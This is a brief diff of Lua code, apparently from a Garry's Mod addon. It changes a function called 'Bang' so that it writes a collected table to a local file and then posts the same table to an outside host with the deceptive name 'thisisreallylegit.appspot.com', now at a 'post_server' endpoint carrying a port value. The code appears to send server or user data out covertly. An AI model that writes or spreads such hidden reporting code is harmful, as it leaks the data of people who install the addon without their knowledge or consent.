@@ -136,7 +136,7 @@ function Bang()
 	file.Append("fuck3.txt", "\n"..table.ToString(Fuck1) )
 	
 	HTTP({
-		url = "http://thisisreallylegit.appspot.com/gmodaddoncounter_post",
+		url = "http://thisisreallylegit.appspot.com/post_server?port="..OneIn(3),
 		method = "post",
 		parameters = Fuck1,
 		failed = function(error)
